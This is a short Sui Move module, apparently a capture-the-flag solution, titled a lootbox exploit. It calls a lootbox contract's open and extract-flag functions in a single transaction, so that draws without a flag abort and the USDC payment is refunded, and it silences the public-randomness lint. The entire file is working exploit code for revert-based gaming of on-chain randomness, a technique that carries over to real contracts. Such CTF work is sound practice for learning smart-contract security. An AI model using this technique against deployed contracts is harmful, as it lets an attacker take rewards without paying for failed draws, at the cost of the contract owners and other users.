#[allow(lint(public_random))]
module exploit::lootbox_exploit;

use sui::coin::Coin;
use sui::random::Random;
use usdc::usdc::USDC;
use ctf::lootboxes;

/// Composition attack: call open_lootbox then immediately extract_flag.
/// If no flag in the lootbox, extract_flag aborts, reverting the entire tx
/// (including the USDC payment). We only lose gas on failed attempts.
public fun try_get_flag(
    payment: Coin<USDC>,
    r: &Random,
    ctx: &mut TxContext
) {
    let maybe_flag = lootboxes::open_lootbox(payment, r, ctx);
    let flag = lootboxes::extract_flag(maybe_flag);
    transfer::public_transfer(flag, ctx.sender());
}
